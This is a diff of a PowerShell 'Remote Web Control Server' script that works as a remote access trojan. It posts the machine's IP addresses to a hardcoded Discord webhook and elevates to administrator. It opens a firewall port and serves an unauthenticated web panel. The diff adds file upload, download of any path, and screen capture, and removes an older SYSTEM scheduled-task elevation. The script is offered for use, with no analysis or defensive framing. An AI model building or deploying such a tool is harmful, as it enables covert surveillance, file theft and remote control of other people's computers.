@@ -1,25 +1,12 @@
-# Basic Remote Web Control Server
+# Remote Web Control Server
 $webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
 # Check if running as administrator
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-NOT $isAdmin) {
-    # Create scheduled task for admin elevation
-    $taskName = "WebRemoteAdmin"
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $command = "powershell -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-    
-    # Create scheduled task with highest privileges
-    schtasks /create /tn $taskName /tr "powershell.exe" /sc onlogon /rl highest /f /ru "SYSTEM" /st 00:00 /ri 1 /du 0001:00:00 /v1 /f
-    schtasks /run /tn $taskName
-    
-    # Wait a moment then delete the task
-    Start-Sleep -Seconds 2
-    schtasks /delete /tn $taskName /f
-    
-    # Don't exit - let the scheduled task run the script
-    # exit
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # Restart as administrator
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
 }
 
 # Open firewall port
@@ -34,12 +21,15 @@ if (!(Test-Path "C:\temp")) {
     New-Item -ItemType Directory -Path "C:\temp" -Force
 }
 
-# Get local IP
-$localIP = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE").IpAddress[0]
+# Get all accessible IPs
+$ips = @()
+$ips += (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE" | ForEach-Object { $_.IpAddress }) | Where-Object { $_ -match "^\d+\.\d+\.\d+\.\d+$" }
+$ips += "127.0.0.1"
 
 # Send IP info to Discord
 try {
-    $body = @{content="Web server started! Access URL: http://$localIP`:$port"} | ConvertTo-Json
+    $ipList = $ips -join "\n"
+    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 } catch {
     # If Discord fails, continue anyway
@@ -60,6 +50,7 @@ $html = @"
         button { background: #4CAF50; color: white; cursor: pointer; }
         button:hover { background: #45a049; }
         .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
+        .file-upload { border: 2px dashed #555; padding: 20px; margin: 10px 0; text-align: center; }
     </style>
 </head>
 <body>
@@ -75,7 +66,24 @@ $html = @"
         </div>
 
         <div class="section">
-            <h3>ℹ️ Actions</h3>
+            <h3>📁 File Manager</h3>
+            <form action="/upload" method="post" enctype="multipart/form-data">
+                <div class="file-upload">
+                    <input type="file" name="file" required>
+                    <button type="submit">Upload File</button>
+                </div>
+            </form>
+            <form action="/download" method="post">
+                <input type="text" name="filepath" placeholder="Enter file path to download..." required>
+                <button type="submit">Download File</button>
+            </form>
+        </div>
+
+        <div class="section">
+            <h3>📸 Actions</h3>
+            <form action="/screenshot" method="post">
+                <button type="submit">📸 Take Screenshot</button>
+            </form>
             <form action="/info" method="post">
                 <button type="submit">ℹ️ System Info</button>
             </form>
@@ -156,13 +164,84 @@ while ($listener.IsListening) {
                 }
             }
             
+            "/upload" {
+                if ($request.HttpMethod -eq "POST") {
+                    try {
+                        $contentType = $request.ContentType
+                        $boundary = $contentType.Split('boundary=')[1]
+                        $data = New-Object System.IO.BinaryReader($request.InputStream).ReadBytes($request.ContentLength64)
+                        $encoding = [System.Text.Encoding]::UTF8
+                        $dataString = $encoding.GetString($data)
+                        
+                        # Simple file extraction
+                        if ($dataString -match 'filename="([^"]+)"') {
+                            $filename = $matches[1]
+                            $filePath = "C:\temp\$filename"
+                            [System.IO.File]::WriteAllBytes($filePath, $data)
+                            $outputBuffer += "File uploaded: $filePath`n"
+                        }
+                    } catch {
+                        $outputBuffer += "Upload failed: $_`n"
+                    }
+                    $response.ContentType = "text/html"
+                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                    $response.ContentLength64 = $buffer.Length
+                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
+                }
+            }
+            
+            "/download" {
+                if ($request.HttpMethod -eq "POST") {
+                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
+                    $filepath = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
+                    if (Test-Path $filepath) {
+                        $response.ContentType = "application/octet-stream"
+                        $response.AddHeader("Content-Disposition", "attachment; filename=$(Split-Path $filepath -Leaf)")
+                        $buffer = [System.IO.File]::ReadAllBytes($filepath)
+                        $response.ContentLength64 = $buffer.Length
+                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
+                    } else {
+                        $response.ContentType = "text/plain"
+                        $buffer = [System.Text.Encoding]::UTF8.GetBytes("File not found")
+                        $response.ContentLength64 = $buffer.Length
+                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
+                    }
+                }
+            }
+            
+            "/screenshot" {
+                try {
+                    Add-Type -AssemblyName System.Windows.Forms
+                    Add-Type -AssemblyName System.Drawing
+                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+                    
+                    # Convert to base64 for direct display
+                    $memoryStream = New-Object System.IO.MemoryStream
+                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+                    $imageBytes = $memoryStream.ToArray()
+                    $base64Image = [System.Convert]::ToBase64String($imageBytes)
+                    
+                    $outputBuffer += "<img src='data:image/png;base64,$base64Image' style='max-width:100%; height:auto;' />`n"
+                    $outputBuffer += "Screenshot captured successfully!`n"
+                } catch {
+                    $outputBuffer += "Screenshot failed: $_`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
             "/info" {
                 $info = @"
 System Information:
 Computer: $env:COMPUTERNAME
 User: $env:USERNAME
 OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
-IP: $localIP
+IPs: $($ips -join ', ')
 "@
                 $outputBuffer += $info
                 $response.ContentType = "text/html"
@@ -197,4 +276,11 @@ IP: $localIP
     $response.Close()
 }
 
-$listener.Stop()
+# Keep server running indefinitely
+try {
+    while ($true) {
+        Start-Sleep -Seconds 1
+    }
+} catch {
+    $listener.Stop()
+}
